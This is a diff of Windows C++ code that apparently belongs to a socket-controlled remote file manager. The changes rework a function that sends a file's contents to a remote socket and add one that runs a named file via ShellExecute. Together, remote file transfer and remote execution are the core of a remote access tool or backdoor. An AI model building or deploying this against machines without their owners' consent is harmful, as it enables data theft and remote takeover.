@@ -1,11 +1,13 @@
 #include "stdafx.h"
 #include <Shlwapi.h> 
+#include <Shellapi.h>
 #include <vector>
-#pragma comment(lib,"shlwapi.lib")   
+#pragma comment(lib,"shlwapi.lib")
 char	*g_reply;
 
 typedef struct {
 	char type;
+	int len;
 	char data[1024];
 }packet;
 
@@ -72,6 +74,8 @@ bool pasteFileCommand() {
 }
 
 
+
+
 bool forcePasteFileCommand() {
 	TCHAR tempFilename[BUFSIZE];
 	GetFullPathName(g_shortFile, BUFSIZE, tempFilename, NULL);
@@ -87,7 +91,6 @@ bool forcePasteFileCommand() {
 	return false;
 }
 
-
 bool downloadFileCommand(LPCWSTR filename, SOCKET socketfd) {
 	packet pac;
 	int readedCount, leftlen;
@@ -95,25 +98,41 @@ bool downloadFileCommand(LPCWSTR filename, SOCKET socketfd) {
 		return false;
 
 	HANDLE fd = CreateFile(filename, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-	leftlen = GetFileSize(fd, NULL);
-	if (fd) {
-		while (leftlen > 0) {
-			ReadFile(fd, pac.data, 1024, (LPDWORD)&readedCount, NULL);
-			leftlen -= readedCount;
-			if (leftlen <= 0) {
-				pac.type = 2;
-				send(socketfd, (const char*)&pac, readedCount + 1, 0);
-			}
-			else {
+	int count = 0;
+	if (fd != INVALID_HANDLE_VALUE ) {
+		pac.type = 3;
+		send(socketfd, (const char*)&pac, sizeof(pac), 0);
+		while (1) {
+			ZeroMemory(&pac, sizeof(pac));
+			if (ReadFile(fd, pac.data, sizeof(pac.data), (LPDWORD)&readedCount, NULL)) {
+				count++;
+				pac.len = readedCount;
+				if (readedCount == 0) {
+					pac.type = 2;
+					pac.len = 0;
+					send(socketfd, (const char*)&pac, sizeof(pac), 0);
+					break;
+				}
 				pac.type = 1;
 				send(socketfd, (const char*)&pac, sizeof(pac), 0);
 			}
+			else {
+				pac.type = 0;
+				pac.len = 0;
+				send(socketfd, (const char*)&pac, sizeof(pac), 0);
+				break;
+			}
 		}
+		CloseHandle(fd);
 		return true;
 	}
-
-	CloseHandle(fd);
 	return false;
+}
+
+bool execCommand(LPCWSTR filename) {
+
+	ShellExecute(NULL, (LPCWSTR)L"open", filename, (LPCWSTR)L"", (LPCWSTR)L"", SW_NORMAL);
+	return true;
 }
 
 bool uploadFileCommand(LPCWSTR filename, SOCKET socketfd) {
@@ -352,4 +371,3 @@ bool upDirCommand() {
 
 	return false;
 }
-
